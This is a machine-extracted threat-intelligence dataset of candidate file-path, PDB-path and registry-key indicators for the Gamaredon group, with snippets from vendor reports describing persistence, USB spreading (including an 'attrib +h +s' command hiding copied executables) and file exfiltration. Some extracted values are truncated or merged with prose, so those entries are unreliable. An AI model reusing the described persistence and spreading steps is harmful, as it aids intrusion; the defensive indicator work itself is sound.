1.0.0,actor--gamaredon,artifact--sha256:ad64550346bd9c85e54880dded13f6d378482dbb86bc058baa06a5052d3a8164,observation--sha256:7df90c05311fe7e99cd07115b18a2be395ceb536a3349815dfffb4eb32b54936,file-path,C:\\Users\\{username}\\AppData\\Local\\profiles_c.ini” .,C:\\Users\\{username}\\AppData\\Local\\profiles_c.ini”,candidate,,unknown,unknown,not-stated,,source--gamaredon--43ece8b760fd4f72,Gamaredon/Cybergun_Technical_Analysis_of_the_Armageddons_Infostealer.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Cybergun: Technical Analysis of the Armageddon's Infostealer 6 To gain persistence, it creates a registry entry “Windows Task” under the RUN key. Then it prepares the string for L”C:\\Users\\{username}\\AppData\\Local\\profiles_c.ini” . After it creates a 12 characters random “x” string it creates a directory under the %TEMP% with the name of “x” string.",
1.0.0,actor--gamaredon,artifact--sha256:f35203bbec0a16e147c54ac67f2933aa6ebd174a9391ad393417e0d44487247d,observation--sha256:ec5251c6923cfe26a76402a396480b5cdd06dc40646303bba84c7320eac36509,file-path,"C:\\”) serial number and return as a string, then it will concat","C:\\”) serial number and return as a string, then it will concat",candidate,,unknown,unknown,not-stated,,source--gamaredon--43ece8b760fd4f72,Gamaredon/Cybergun_Technical_Analysis_of_the_Armageddons_Infostealer.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Cybergun: Technical Analysis of the Armageddon's Infostealer 7 L”C:\\Users\\{username}\\AppData\\Local\\TEMP\\XXXXXXXXXX” Then it reads main volume’s (“C:\\”) serial number and return as a string, then it will concat the other information that taken from the PC like “ComputerName||UserName||Random12CharString||VolumeSerialNumber” Before connecting the C2 Server it first prepares the hardcoded domain name with random string subdomain.",
1.0.0,actor--gamaredon,artifact--sha256:8a7325e74c9fd5635902d005acd0d5a76c58be03bce2cee67be934889201383a,observation--sha256:947cb8c066e90c2ca2eb1a1fc0917035194cd142c98a8e8eb8b122ac740c4a7e,file-path,E:\***.exe,E:\***.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Once persistence mechanism is implemented in the victim's system, the orchestrator cmd file checks the presence of connected removable data storage and copies PE files from the directory %APPDATA%\Microsoft\Crypto\keys\serial number of the volume \executable file every 5 minutes. During the copying process, the file name is changed, and the file hidin g attributes are set to attrib +h +s /s E:\***.exe A shortcut called New folder is created on the attached media through the marker ""3"" from the s",
1.0.0,actor--gamaredon,artifact--sha256:5d14c5fdddeba133efa80d50178bdc79f8ddebb207b2f94547effe1eab002fad,observation--sha256:13b293425a767a901a0a557dddeeef181c53ef574372cc792a2db2ebb7e19cd3,file-path,E:\Boot,E:\Boot,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Once persistence mechanism is implemented in the victim's system, the orchestrator cmd file checks the presence of connected removable data storage and copies PE files from the directory %APPDATA%\Microsoft\Crypto\keys\serial number of the volume \executable file every 5 minutes. During the copying process, the file name is changed, and the file hidin g attributes are set to attrib +h +s /s E:\***.exe A shortcut called New folder is created on the attached media through the marker ""3"" from the s",
1.0.0,actor--gamaredon,artifact--sha256:48fb2c74fcba2c4dd6fca2a02e4b062ddb31b895b0941192e56fcb98d78a8fa3,observation--sha256:7ad8125b276dcc107da1fa88cb93cfa720f31d1d5d674b41260567a2a32bdf61,file-path,E:\Boot\*.doc,E:\Boot\*.doc,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Once persistence mechanism is implemented in the victim's system, the orchestrator cmd file checks the presence of connected removable data storage and copies PE files from the directory %APPDATA%\Microsoft\Crypto\keys\serial number of the volume \executable file every 5 minutes. During the copying process, the file name is changed, and the file hidin g attributes are set to attrib +h +s /s E:\***.exe A shortcut called New folder is created on the attached media through the marker ""3"" from the s",
1.0.0,actor--gamaredon,artifact--sha256:74ade1ec2dbe49eb04af26e01ccd3d859d60db1b0c3130de284eef1228b7fdfe,observation--sha256:33b2ed562edb026e9348c142f510a8250dfc22f61ca816201b984fb5220ecbdc,file-path,E:\Projects\RESEARCH\TOOLS\c++\Reverse\Release\Reverse.pdb,E:\Projects\RESEARCH\TOOLS\c++\Reverse\Release\Reverse.pdb,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:0af56fe611fb8a25d7d5f77ab1c99ca824fa72a4ec60948bf72e78bd89341ca9,observation--sha256:48b821ec00b6c6323f7ae60d2c72fcd78e73f35ab67c6b49ad68cd911eac9f2f,file-path,E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb,E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 payload, pauses for a few seconds, and deletes all three files: the dropper, itself, and the VBScript payload. Throughout PteroCDrop’s lifetime, Gamaredon has used various compilers to build it and in some of the samples this PDB path was left: E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb Overall, the most prevalent payload delivered by PteroCDrop is a VBScript version of PteroLNK. During 2023",
1.0.0,actor--gamaredon,artifact--sha256:29b45610f9cacd6de2575df801ca4c7481b8d5e8a780b4dea97c5fbb356ce73a,observation--sha256:91ec73c8f76a8f033f5097117018dc38fa9d44994fa16c6bfe0f1b3c5c39db07,pdb-path,E:\Projects\RESEARCH\TOOLS\c++\Reverse\Release\Reverse.pdb,E:\Projects\RESEARCH\TOOLS\c++\Reverse\Release\Reverse.pdb,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:3464949a2b5c7673bb0f305cbe29e4c9f895ce5d427e2abcab087784c0fee906,observation--sha256:a7d785549af61b6dd34b5b17e203232bee805003d1959009438869f13e5821af,pdb-path,E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb,E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 payload, pauses for a few seconds, and deletes all three files: the dropper, itself, and the VBScript payload. Throughout PteroCDrop’s lifetime, Gamaredon has used various compilers to build it and in some of the samples this PDB path was left: E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb Overall, the most prevalent payload delivered by PteroCDrop is a VBScript version of PteroLNK. During 2023",
1.0.0,actor--gamaredon,artifact--sha256:fd07c3b47c9544bd4e869434fb97652ee99496ba7fd93ecf0773997432071c2c,observation--sha256:e4ec36e9088e75a96a0660244fbab3261330365ae1bd9d3980623916bf7f1e5c,registry-key,HKCU\Abstractions,HKCU\Abstractions,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"24 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Capabilities PteroPSDoor’s main goal is to search all mapped drives for files with specific extensions, and subsequently exfiltrate such files to C&C servers or cloud storage accounts operated by Gamaredon. On March 1st, 2025, PteroPSDoor received quite an interesting update , in which Gamaredon added several fallback methods – probably to overcome network -based blocking. First, Gamaredon added a fallback upload me",
1.0.0,actor--gamaredon,artifact--sha256:f4679c34a0a08b1361c63b97abd56a7d1d14b845e9d422ab10ac5c0afeb5e483,observation--sha256:2844f0cff98092233118908e876c49f7442d6d6efd00a9495ed6eeab4b606cc2,registry-key,HKCU\Abstractions \[a-zA-Z0-9]{19,HKCU\Abstractions \[a-zA-Z0-9]{19,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 46}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"46 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value Mutexes %PROCESSOR_IDENTIFIER% %COMPUTERNAME% Scheduled task names dropbox %COMPUTERNAME% %COMPUTERNAME%_1 APPENDIX G: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPSDOOR Name Value Installation paths HKCU\Software \[a-zA-Z0-9]{19,25} HKCU\Abstractions \[a-zA-Z0-9]{19,25} HKCU\AppEvents \[a-zA-Z0-9]{19,25} HKCU\Printers \[a-zA-Z0-9]{19,25} %USERPROFILE% \%PROCESSOR_LEVEL%_%PROCESSOR_REVISION% \data\geoip %US",
1.0.0,actor--gamaredon,artifact--sha256:73e0ff7be00721448c2845c103f503b7b4e36c7c48dafb0780c280490e013613,observation--sha256:231d47b39b80a59f0904911105a7966cfe8b7d85757e5b25bb24b3ed6e5ba278,registry-key,HKCU\AppEvents \[a-zA-Z0-9]{19,HKCU\AppEvents \[a-zA-Z0-9]{19,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 46}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"46 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value Mutexes %PROCESSOR_IDENTIFIER% %COMPUTERNAME% Scheduled task names dropbox %COMPUTERNAME% %COMPUTERNAME%_1 APPENDIX G: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPSDOOR Name Value Installation paths HKCU\Software \[a-zA-Z0-9]{19,25} HKCU\Abstractions \[a-zA-Z0-9]{19,25} HKCU\AppEvents \[a-zA-Z0-9]{19,25} HKCU\Printers \[a-zA-Z0-9]{19,25} %USERPROFILE% \%PROCESSOR_LEVEL%_%PROCESSOR_REVISION% \data\geoip %US",
1.0.0,actor--gamaredon,artifact--sha256:8117e0cf28b5bbf25103df00158b8de22302ccc77758edd129bc78123b71583e,observation--sha256:59f46f45ab0e88914a4874cad5c8ca308244cdb6bf7a9b7a1581d80cfe54a936,registry-key,HKCU\AppEvents \[a-z]{2,HKCU\AppEvents \[a-z]{2,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 44}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"44 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %APPDATA% \{ConnectedDevicesPlatform|Windows|Explorer }\desktoph %APPDATA% \{ConnectedDevicesPlatform|Windows|Explorer }\desktopr %APPDATA% \Logs\[a-zA-Z0-9]+ Scheduled task names MicrosoftEdgeUpdateTaskMachineUA MicrosoftEdgeUpdateTaskMachineCore MicrosoftUpdateTaskMachineUA MicrosoftUpdateTaskMachineCore Filenames для службового користування.lnk Прибуття.lnk Вибуття.lnk ФОТО.lnk Акти.lnk ЖБД.lnk Доповід",
1.0.0,actor--gamaredon,artifact--sha256:6fc6745dc4f3069d266b7c843b7089bc6625566c9d4f8c3ad25aea7179cc6310,observation--sha256:35de2dc829fb1075e7249826d915528ee89c73cb0a467862d6df04a43673607a,registry-key,HKCU\Console \IP.,HKCU\Console \IP,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Improving LNK lures The second variant of PteroLNK creates three types of malicious LNK files, each designed to lure victims into executing them. Over the course of 2025, Gamaredon repeatedly refined how these LNK files were generated, focusing on naming strategies and file t argeting to maximize the likelihood of user interaction. Below is a summary of each type and its final state by the end of the year: 1. LNK fi",
1.0.0,actor--gamaredon,artifact--sha256:6fc6745dc4f3069d266b7c843b7089bc6625566c9d4f8c3ad25aea7179cc6310,observation--sha256:3f593c828f81e4c49d37bec44417ece23a0861c86498c8bdb116ef2337bde122,registry-key,HKCU\Console \IP,HKCU\Console \IP,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"42 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \boot.ini:URLTeletype %USERPROFILE% \boot.ini:WindowsDetect %USERPROFILE% \boot.ini:URLTelegra %USERPROFILE% \boot.ini:WindowsTelegra %USERPROFILE% \boot.ini:URL %USERPROFILE% \boot.ini:IP HKCU\Console \URL HKCU\Console \IP Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DXGIAdapterCache HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DirectXDatabaseUpda ter HKC",
1.0.0,actor--gamaredon,artifact--sha256:b645ff856238ef484a011b7a2e3287e4eccfe1d307d2a1bc467cbd32ba2b5041,observation--sha256:5db94c5331be3555a68c431228959d0470f55d4a6f209702e7855af2e55f7f55,registry-key,HKCU\Console \URL.,HKCU\Console \URL,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Improving LNK lures The second variant of PteroLNK creates three types of malicious LNK files, each designed to lure victims into executing them. Over the course of 2025, Gamaredon repeatedly refined how these LNK files were generated, focusing on naming strategies and file t argeting to maximize the likelihood of user interaction. Below is a summary of each type and its final state by the end of the year: 1. LNK fi",
1.0.0,actor--gamaredon,artifact--sha256:b645ff856238ef484a011b7a2e3287e4eccfe1d307d2a1bc467cbd32ba2b5041,observation--sha256:7c1614f9da1903b525fdea31867dac0bb3da20dc5829eb7d99134c72956348d3,registry-key,HKCU\Console \URL,HKCU\Console \URL,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"42 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \boot.ini:URLTeletype %USERPROFILE% \boot.ini:WindowsDetect %USERPROFILE% \boot.ini:URLTelegra %USERPROFILE% \boot.ini:WindowsTelegra %USERPROFILE% \boot.ini:URL %USERPROFILE% \boot.ini:IP HKCU\Console \URL HKCU\Console \IP Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DXGIAdapterCache HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DirectXDatabaseUpda ter HKC",
1.0.0,actor--gamaredon,artifact--sha256:9a64c797cf82ea1c9224556a5afcb892b71b49d53b6e7fcaeac08d6efe53d15d,observation--sha256:8236e5ea91583b6438a5b1b5d21d862a7d2c70b5d681ac6099e0999297a0f849,registry-key,HKCU\Cursors . Now,HKCU\Cursors . Now,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances described in detail in our Gamaredon 2024 white paper. That version was being used without notable updates until March 23rd, 2025, when it was replaced with a new version. Two days later , 2025, we discovered this updated version, now featuring additional obfuscation and an empty URI path in HTTP requests. Lacking a unique URI, on which we based our naming of all the previous versions , we named it version 13, as it",
1.0.0,actor--gamaredon,artifact--sha256:664e4b8c1f39b9bd699115a3b04f875086617623d26fb4d641a40e0f888f5e85,observation--sha256:ac94c23731ccbdf7fba95cf6ae8e372d61fd2deca599730a85bb8d8025608e3b,registry-key,HKCU\Cursors . This loader executes the initial part,HKCU\Cursors . This loader executes the initial part,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances described in detail in our Gamaredon 2024 white paper. That version was being used without notable updates until March 23rd, 2025, when it was replaced with a new version. Two days later , 2025, we discovered this updated version, now featuring additional obfuscation and an empty URI path in HTTP requests. Lacking a unique URI, on which we based our naming of all the previous versions , we named it version 13, as it",
1.0.0,actor--gamaredon,artifact--sha256:a8694e7acadbcf791192f469e31cff486f6979576cd0163e91c8a36a8e71ef00,observation--sha256:b835d4178c15d391403e1899be9597e22ae0fa23f3695d8c95dd5537dbe01c99,registry-key,HKCU\Cursors \[a-zA-Z0-9]{19,HKCU\Cursors \[a-zA-Z0-9]{19,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 44}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"44 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %APPDATA% \{ConnectedDevicesPlatform|Windows|Explorer }\desktoph %APPDATA% \{ConnectedDevicesPlatform|Windows|Explorer }\desktopr %APPDATA% \Logs\[a-zA-Z0-9]+ Scheduled task names MicrosoftEdgeUpdateTaskMachineUA MicrosoftEdgeUpdateTaskMachineCore MicrosoftUpdateTaskMachineUA MicrosoftUpdateTaskMachineCore Filenames для службового користування.lnk Прибуття.lnk Вибуття.lnk ФОТО.lnk Акти.lnk ЖБД.lnk Доповід",
1.0.0,actor--gamaredon,artifact--sha256:c0374d6aae2ae9103d15d57f2571c7134d1fa625b4d50fdd0d8c331075f1bdf3,observation--sha256:51c4c2a0622180fcc61c70c00dda3ac6b50a0b9fca37401f452f1473c413ed0f,registry-key,HKCU\EUDC,HKCU\EUDC,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances described in detail in our Gamaredon 2024 white paper. That version was being used without notable updates until March 23rd, 2025, when it was replaced with a new version. Two days later , 2025, we discovered this updated version, now featuring additional obfuscation and an empty URI path in HTTP requests. Lacking a unique URI, on which we based our naming of all the previous versions , we named it version 13, as it",
1.0.0,actor--gamaredon,artifact--sha256:a618a677def37801e820750fefe7e6ca7de9494ff132409fdc7ed4145326255e,observation--sha256:7272a81279a9632b8badf3a8b1f73c5cd195f1c053156e22d5d6708779af55d4,registry-key,HKCU\EUDC\[a-zA-Z0-9]{19,HKCU\EUDC\[a-zA-Z0-9]{19,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 44}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"44 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %APPDATA% \{ConnectedDevicesPlatform|Windows|Explorer }\desktoph %APPDATA% \{ConnectedDevicesPlatform|Windows|Explorer }\desktopr %APPDATA% \Logs\[a-zA-Z0-9]+ Scheduled task names MicrosoftEdgeUpdateTaskMachineUA MicrosoftEdgeUpdateTaskMachineCore MicrosoftUpdateTaskMachineUA MicrosoftUpdateTaskMachineCore Filenames для службового користування.lnk Прибуття.lnk Вибуття.lnk ФОТО.lnk Акти.lnk ЖБД.lnk Доповід",
1.0.0,actor--gamaredon,artifact--sha256:a618a677def37801e820750fefe7e6ca7de9494ff132409fdc7ed4145326255e,observation--sha256:347215aafb3308206e2669e6f9c2411546f7b440320995937b898c5cdb06c450,registry-key,HKCU\EUDC\[a-zA-Z0-9]{19,HKCU\EUDC\[a-zA-Z0-9]{19,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"45 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \%USERNAME% \([a-zA-Z0-9]{19,25}): \1 Configuration paths HKCU\EUDC\[a-zA-Z0-9]{19,25} Mutexes Global \MutexLaos Global \MutexLaos1 Global \MutexNosa Global \MutexNosas Global \MutexTa Global \MutexTanos Global \MutexTanoss Global \MutexTest APPENDIX F: HOST -BASED ARTIFACTS ASSOCIATED WITH PTEROBOX Name Value Installation paths HKCU\Keyboard Layout \getListFile HKCU\Keyboard Layout \usb HKC",
1.0.0,actor--gamaredon,artifact--sha256:e4426abbe0be7e5ee13da21370f563a4848b720562011e48fd6f010974da6345,observation--sha256:ab5605ff3a124be784cc0427d32bfc9fd925f499fd77cda36acb9b2e1b803b95,registry-key,HKCU\EUDC\first,HKCU\EUDC\first,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"40 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX A: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPASTE Name Value Installation paths HKCU\EUDC\first HKCU\EUDC\knok HKCU\EUDC\runner HKCU\EUDC\usb Configuration paths HKCU\EUDC\privateKeyXml Filenames .lnk %PROCESSOR_REVISION% %PROCESSOR_REVISION%.ps1 volumeinfo.ps1 test.ps1 Mutexes Local \[0-9]{4}(0[1 -9]|1[1 -2]) Scheduled task names %PROCESSOR_IDENTIFIER% Scheduled task descriptions %PROCESSOR_IDENTIFIER% AP",
1.0.0,actor--gamaredon,artifact--sha256:515232d83788a5b5cf84039d9ea24b345026c78bf78b085e2b14982a7d92ab61,observation--sha256:225b242543d4447b8c0634e76c358d20b57424e802d8a77e5762fda60a046153,registry-key,HKCU\EUDC\knok,HKCU\EUDC\knok,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"40 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX A: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPASTE Name Value Installation paths HKCU\EUDC\first HKCU\EUDC\knok HKCU\EUDC\runner HKCU\EUDC\usb Configuration paths HKCU\EUDC\privateKeyXml Filenames .lnk %PROCESSOR_REVISION% %PROCESSOR_REVISION%.ps1 volumeinfo.ps1 test.ps1 Mutexes Local \[0-9]{4}(0[1 -9]|1[1 -2]) Scheduled task names %PROCESSOR_IDENTIFIER% Scheduled task descriptions %PROCESSOR_IDENTIFIER% AP",
1.0.0,actor--gamaredon,artifact--sha256:04c07b670afc4402ddd3f7f10a1ab9fe3a4b065053d65e5ca70a1964fab1ee20,observation--sha256:f7f323f82f380a65946debf39788192c012b07f1e8738a932ef1385ed95b80a6,registry-key,HKCU\EUDC\privateKeyXml,HKCU\EUDC\privateKeyXml,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"40 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX A: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPASTE Name Value Installation paths HKCU\EUDC\first HKCU\EUDC\knok HKCU\EUDC\runner HKCU\EUDC\usb Configuration paths HKCU\EUDC\privateKeyXml Filenames .lnk %PROCESSOR_REVISION% %PROCESSOR_REVISION%.ps1 volumeinfo.ps1 test.ps1 Mutexes Local \[0-9]{4}(0[1 -9]|1[1 -2]) Scheduled task names %PROCESSOR_IDENTIFIER% Scheduled task descriptions %PROCESSOR_IDENTIFIER% AP",
1.0.0,actor--gamaredon,artifact--sha256:5d710f68453af50958d2df66f85c105579ce51cf29877813d6fa4fb0c820756a,observation--sha256:1d33f81cbde5b8a9ebafa0430f56a808dd969c29ce766b5af946b4b59a9672f1,registry-key,HKCU\EUDC\runner,HKCU\EUDC\runner,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"40 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX A: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPASTE Name Value Installation paths HKCU\EUDC\first HKCU\EUDC\knok HKCU\EUDC\runner HKCU\EUDC\usb Configuration paths HKCU\EUDC\privateKeyXml Filenames .lnk %PROCESSOR_REVISION% %PROCESSOR_REVISION%.ps1 volumeinfo.ps1 test.ps1 Mutexes Local \[0-9]{4}(0[1 -9]|1[1 -2]) Scheduled task names %PROCESSOR_IDENTIFIER% Scheduled task descriptions %PROCESSOR_IDENTIFIER% AP",
1.0.0,actor--gamaredon,artifact--sha256:ad824f7f1e740657629993a34f91b2cbedb953bb6b319193416f4f19f30a8be7,observation--sha256:0ff7453c0a3947e36863a43771d2ebcd36dda9f37ea47db9a00903da67cecbfe,registry-key,HKCU\EUDC\usb,HKCU\EUDC\usb,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"40 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX A: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPASTE Name Value Installation paths HKCU\EUDC\first HKCU\EUDC\knok HKCU\EUDC\runner HKCU\EUDC\usb Configuration paths HKCU\EUDC\privateKeyXml Filenames .lnk %PROCESSOR_REVISION% %PROCESSOR_REVISION%.ps1 volumeinfo.ps1 test.ps1 Mutexes Local \[0-9]{4}(0[1 -9]|1[1 -2]) Scheduled task names %PROCESSOR_IDENTIFIER% Scheduled task descriptions %PROCESSOR_IDENTIFIER% AP",
1.0.0,actor--gamaredon,artifact--sha256:afc0550b2c84f39370da5f138589cc1aa4ddb5cdada57f0c9b24e918bf10d857,observation--sha256:3bd313d23bc4c60f67b84705565ee3ebc646c05e1b99b49d99ef53d65ed6b703,registry-key,HKCU\Environment  to execute itself on user log in. Since the update on,HKCU\Environment to execute itself on user log in. Since the update on,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances described in detail in our Gamaredon 2024 white paper. That version was being used without notable updates until March 23rd, 2025, when it was replaced with a new version. Two days later , 2025, we discovered this updated version, now featuring additional obfuscation and an empty URI path in HTTP requests. Lacking a unique URI, on which we based our naming of all the previous versions , we named it version 13, as it",
